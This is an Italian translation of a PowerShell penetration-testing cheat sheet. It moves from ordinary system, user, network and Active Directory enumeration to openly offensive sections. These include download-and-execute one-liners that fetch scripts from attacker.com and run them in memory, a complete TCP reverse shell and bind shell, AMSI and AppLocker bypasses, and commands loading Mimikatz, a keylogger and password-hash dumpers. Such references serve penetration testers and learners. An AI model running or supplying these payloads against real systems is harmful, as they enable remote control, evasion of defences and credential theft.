# 💻 PowerShell - Scheda completa per il penetration testing

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

> **Nota di compatibilità:** molti esempi sono per Windows PowerShell 5.1. `Get-WmiObject` e diversi cmdlet legacy non sono disponibili in PowerShell 7; i moduli AD/GPO richiedono i relativi componenti ([differenze Microsoft](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell)). L’execution policy non è un confine di sicurezza e `-Scope CurrentUser` persiste oltre la sessione ([documentazione Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)). In Windows PowerShell, `sc` può essere un alias diverso dall’utilità dei servizi e la redirezione `<` mostrata con `more` usa sintassi di cmd.exe. Gli esempi AMSI contengono un frammento incompleto; PowerShell 2.0, i nomi dei campi interni e i presunti bypass dipendono dalle versioni e dalle policy. Base64 non è cifratura e l’esecuzione in memoria non garantisce assenza di log o rilevamenti.

---

## 📋 Indice

- [Fondamenti](#-fondamenti)
- [Enumerazione del sistema](#-enumerazione-del-sistema)
- [Enumerazione degli utenti](#-enumerazione-degli-utenti)
- [Comandi di rete](#-comandi-di-rete)
- [Operazioni sui file](#-operazioni-sui-file)
- [Gestione dei processi e dei servizi](#-gestione-dei-processi-e-dei-servizi)
- [Operazioni sul registro](#-operazioni-sul-registro)
- [Active Directory](#-active-directory)
- [Download ed esecuzione](#-download-ed-esecuzione)
- [Reverse shell](#-reverse-shell)
- [Tecniche di aggiramento](#-tecniche-di-aggiramento)
- [Strumenti offensivi](#-strumenti-offensivi)
- [Comandi su una sola riga](#-comandi-su-una-sola-riga)

---

## 🔰 Fondamenti

### Criteri di esecuzione (execution policy)

```powershell
# Verifica il criterio corrente
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Aggira il criterio di esecuzione (sessione corrente)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Esegui lo script aggirando il criterio
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Accesso alla guida

```powershell
# Ottieni la guida del comando
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Aggiorna la guida
Update-Help

# Elenca tutti i comandi
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variabili e operatori

```powershell
# Variabili
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Variabili d'ambiente
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Operatori di confronto
-eq   # Uguale
-ne   # Diverso
-gt   # Maggiore di
-lt   # Minore di
-like # Corrispondenza con caratteri jolly
-match # Corrispondenza con espressione regolare
```

### Pipeline e filtri

```powershell
# Inoltra l'output nella pipeline
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Seleziona le proprietà
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Ordina
Get-Process | Sort-Object CPU -Descending

# Formatta l'output
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

## 🔍 Enumerazione del sistema

### Informazioni sul sistema

```powershell
# Informazioni sul computer
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Versione del sistema operativo
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Architettura
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Hotfix e patch
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Software installato

```powershell
# Software a 64 bit
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Software a 32 bit su sistema operativo a 64 bit
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Tramite WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Elenco rapido
Get-Package
```

### Antivirus e sicurezza

```powershell
# Ottieni gli antivirus
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Stato del firewall
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Regole del firewall
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Esclusioni di Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Attività pianificate

```powershell
# Elenca le attività pianificate
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Dettagli dell'attività
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

## 👤 Enumerazione degli utenti

### Utenti locali

```powershell
# Utente corrente
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Tutti gli utenti locali
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Dettagli dell'utente
Get-LocalUser Administrator
net user Administrator

# Gruppi dell'utente
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Privilegi dell'utente

```powershell
# Privilegi correnti
whoami /priv
whoami /all
whoami /groups

# Verifica se è amministratore
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Gruppi

```powershell
# Elenca i gruppi locali
Get-LocalGroup
net localgroup

# Membri del gruppo
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Utenti connessi

```powershell
# Attualmente connessi
query user
quser
qwinsta

# Accessi recenti
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

## 🌐 Comandi di rete

### Configurazione di rete

```powershell
# Configurazione IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Rotte
Get-NetRoute
route print

# Tabella ARP
Get-NetNeighbor
arp -a
```

### Porte aperte e connessioni

```powershell
# Connessioni TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# Connessioni UDP
Get-NetUDPEndpoint

# Individua il processo tramite la porta
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Test di rete

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Verifica della porta
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Tracciamento del percorso di rete
Test-NetConnection -ComputerName google.com -TraceRoute

# Ricerca DNS
Resolve-DnsName google.com
nslookup google.com
```

### Condivisioni di rete

```powershell
# Elenca le condivisioni
Get-SmbShare
net share

# Mappa un'unità di rete
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Elenca le condivisioni connesse
Get-SmbConnection
net use

# Accedi alla condivisione
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

## 📁 Operazioni sui file

### Navigazione ed elenchi

```powershell
# Directory corrente
Get-Location
pwd

# Cambia directory
Set-Location C:\Users
cd C:\Users

# Elenca i file
Get-ChildItem
Get-ChildItem -Force  # Includi gli elementi nascosti
Get-ChildItem -Recurse
ls
dir

# Elenca i file nascosti
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Ricerca dei file

```powershell
# Trova i file per nome
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Trova i file contenenti testo
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Trova i file di grandi dimensioni
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Trova i file modificati di recente
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Lettura e scrittura dei file

```powershell
# Leggi il file
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Scrivi nel file
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Aggiungi in coda

# Copia, spostamento ed eliminazione
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Flussi di dati alternativi (ADS)

```powershell
# Elenca gli ADS
Get-Item file.txt -Stream *
dir /r file.txt

# Leggi l'ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# Scrivi nell'ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Rimuovi l'ADS
Remove-Item file.txt -Stream hidden
```

### Calcolo degli hash

```powershell
# Ottieni l'hash del file
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Verifica l'hash
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

## ⚙ Gestione dei processi e dei servizi

### Processi

```powershell
# Elenca i processi
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Dettagli del processo
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Avvia il processo
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Come amministratore

# Termina il processo
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Servizi

```powershell
# Elenca i servizi
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Dettagli del servizio
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Avvia e arresta i servizi
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Percorso del servizio (per verificare i percorsi senza virgolette)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

## 📝 Operazioni sul registro

### Lettura del registro

```powershell
# Elenca le chiavi del registro
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Ottieni il valore del registro
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Cerca nel registro
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Scrittura nel registro

```powershell
# Crea la chiave
New-Item -Path HKCU:\SOFTWARE\MyKey

# Imposta il valore
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Elimina
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Percorsi importanti nel registro

```powershell
# Percorsi di esecuzione automatica
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Uninstall (software installato)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (richiede SYSTEM)
# HKLM:\SAM\SAM

# Segreti LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

## 🏢 Active Directory

### Informazioni sul dominio

```powershell
# Informazioni sul dominio
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Controller di dominio
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Informazioni sulla foresta
Get-ADForest

# Relazioni di trust
Get-ADTrust -Filter *
```

### Enumerazione degli utenti (AD)

```powershell
# Tutti gli utenti del dominio
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Utente specifico
Get-ADUser -Identity administrator -Properties *

# Utenti con una proprietà specifica
Get-ADUser -Filter {AdminCount -eq 1}  # Amministratori
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Account con SPN (potenzialmente soggetti a Kerberoasting)

# Cerca gli utenti
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Enumerazione dei gruppi (AD)

```powershell
# Tutti i gruppi
Get-ADGroup -Filter *

# Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# Gruppi dell'utente
Get-ADPrincipalGroupMembership username
```

### Enumerazione dei computer (AD)

```powershell
# Tutti i computer
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Controller di dominio
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Server
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### Informazioni sugli oggetti Criteri di gruppo (GPO)

```powershell
# Elenca i GPO
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# Dettagli del GPO
Get-GPO -Name "Default Domain Policy"

# Report del GPO
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

## ⬇ Download ed esecuzione

### Download dei file

```powershell
# Invoke-WebRequest (equivalente a wget/curl)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (più rapido nell'esempio originale)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Scarica una stringa (per gli script)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# Trasferimento BITS (indicato come meno visibile nell'originale)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (LOLBin, binario legittimo utilizzabile per altre operazioni)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Download ed esecuzione in memoria

```powershell
# IEX - Invoke-Expression (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Con una variabile
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Esecuzione codificata

```powershell
# Codifica il comando in Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Esegui il comando codificato
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Codificatore su una sola riga
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

## 🔌 Reverse shell

### Reverse shell PowerShell

```powershell
# Reverse shell TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Reverse shell su una sola riga

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell bind

```powershell
# Resta in ascolto sulla porta
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

## 🛡 Tecniche di aggiramento

### Aggiramento dei criteri di esecuzione

```powershell
# Metodi di aggiramento
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Leggi e inoltra nella pipeline
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Scarica una stringa (senza file su disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Aggiramento dell'interfaccia di scansione antimalware (AMSI)

```powershell
# Aggiramento semplice (può essere rilevato)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Offuscato
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Modifica della memoria (richiede amministratore nell'originale)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (codice completo di aggiramento)
```

### Aggiramento della modalità di linguaggio vincolato

```powershell
# Verifica la modalità del linguaggio
$ExecutionContext.SessionState.LanguageMode

# Se ConstrainedLanguage, prova:
# - PowerShell 2.0 (se disponibile)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Aggiramento di AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Verifica le regole AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## 🔫 Strumenti offensivi

### PowerSploit

```powershell
# Download
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (enumerazione AD)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (escalation dei privilegi)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Esecuzione dello stager (da Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Reverse shell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Keylogger
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

## ⚡ Comandi su una sola riga

### Enumerazione su una sola riga

```powershell
# Informazioni sul sistema
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Utenti
Get-LocalUser | Select Name,Enabled

# Software installato
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Porte aperte
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Servizi in esecuzione
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Attività pianificate
schtasks /query /fo TABLE | findstr /v "TaskName"

# Stato dell'antivirus
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Firewall
Get-NetFirewallProfile | Select Name,Enabled
```

### Download su una sola riga

```powershell
# Download tramite PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Tabella dei comandi

| Scopo | Comando |
|---------|---------|
| Utente corrente | `whoami` |
| Tutti gli utenti | `Get-LocalUser` |
| Amministratori | `Get-LocalGroupMember Administrators` |
| Informazioni sul sistema | `systeminfo` |
| Configurazione IP | `Get-NetIPAddress` |
| Porte aperte | `Get-NetTCPConnection -State Listen` |
| Processi | `Get-Process` |
| Servizi | `Get-Service \| Where Status -eq Running` |
| Trova i file | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Cerca nel contenuto | `Select-String -Path "C:\*" -Pattern "password"` |
| Scarica il file | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Esecuzione codificata | `powershell -enc <base64>` |

---

## 📚 Risorse

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [PowerShell su HackTricks](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Schede di riferimento correlate
- [Mimikatz](../../Mimikatz/translations/README.it.md)
- [Escalation dei privilegi Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.it.md)

---

<p align="center">
  <b>💻 Padroneggia PowerShell per il penetration testing!</b><br>
  <i>Un linguaggio di scripting potente per Windows</i>
</p>
